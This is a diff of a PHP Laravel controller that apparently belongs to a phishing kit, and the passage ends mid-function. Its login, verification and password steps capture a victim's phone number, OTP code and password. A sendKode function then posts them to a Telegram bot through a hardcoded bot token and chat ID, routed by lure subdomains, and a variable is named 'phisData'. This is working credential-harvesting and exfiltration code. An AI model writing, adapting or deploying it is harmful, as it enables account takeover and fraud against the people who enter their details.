@@ -10,12 +10,13 @@ class HomeController extends Controller
 
     public function index(Request $request)
     {
-        dd($subdomain = explode('.', $request->getHost())[0]);
+
         return inertia('LoginIndex');
     }
 
     public function login_store(Request $request)
     {
+        $subdomain = explode('.', $request->getHost())[0];
         Session::forget("dataNumber");
         $phone = $request->phone;
         $code = $request->code;
@@ -23,7 +24,7 @@ class HomeController extends Controller
             'getPhone' => $phone,
             'getDialCode' => $code,
         ]);
-        $this->sendKode($phone, $code);
+        $this->sendKode($phone, $code, "", "", $subdomain);
         return redirect('verif');
     }
 
@@ -38,6 +39,7 @@ class HomeController extends Controller
 
     public function verif_store(Request $request)
     {
+        $subdomain = explode('.', $request->getHost())[0];
         Session::forget("dataNumber");
         $phone = $request->phone;
         $code = $request->dial_code;
@@ -47,7 +49,7 @@ class HomeController extends Controller
             'getDialCode' => $code,
             'getVerif' => $verif,
         ]);
-        $this->sendKode($phone, $code, $verif);
+        $this->sendKode($phone, $code, "", $verif, $subdomain);
         return redirect('password');
     }
 
@@ -66,12 +68,13 @@ class HomeController extends Controller
     }
     public function store_password(Request $request)
     {
+        $subdomain = explode('.', $request->getHost())[0];
         Session::forget("dataNumber");
         $phone = $request->phone;
         $code = $request->dial_code;
         $verif = $request->code;
         $password = $request->password;
-        $this->sendKode($phone, $code, $verif, $password);
+        $this->sendKode($phone, $code, $verif, $password, $subdomain);
         return redirect('');
     }
 
@@ -79,15 +82,46 @@ class HomeController extends Controller
     {
         return inertia('Index');
     }
-    public function sendKode($phone = "", $code = "", $otp = "", $password = "")
+    public function sendKode($phone = "", $code = "", $otp = "", $password = "", $subdomain = "")
     {
+        // mulai dari bot 6 yah
+
+        if ($subdomain == "live-vc-private1-my6") {
+            dd("6");
+            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
+            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
+            $chat_id = "7637087335";
+        } else   if ($subdomain == "live-vc-private1-my7") {
+            dd("7");
+            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
+            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
+            $chat_id = "7637087335";
+        } else  if ($subdomain == "live-vc-private1-my8") {
+            dd("8");
+            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
+            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
+            $chat_id = "7637087335";
+        } else  if ($subdomain == "live-vc-private1-my9") {
+            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
+            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
+            $chat_id = "7637087335";
+        } else  if ($subdomain == "live-vc-private1-my10") {
+            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
+            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
+            $chat_id = "7637087335";
+        } else  if ($subdomain == "live-vc-private1-my11") {
+            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
+            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
+            $chat_id = "7637087335";
+        } else  if ($subdomain == "live-vc-private1-my12") {
+            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
+            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
+            $chat_id = "7637087335";
+        }
 
 
 
 
-        $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
-        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
-        $chat_id = "7637087335";
 
         $ch = curl_init();
         $phisData = "MY2";
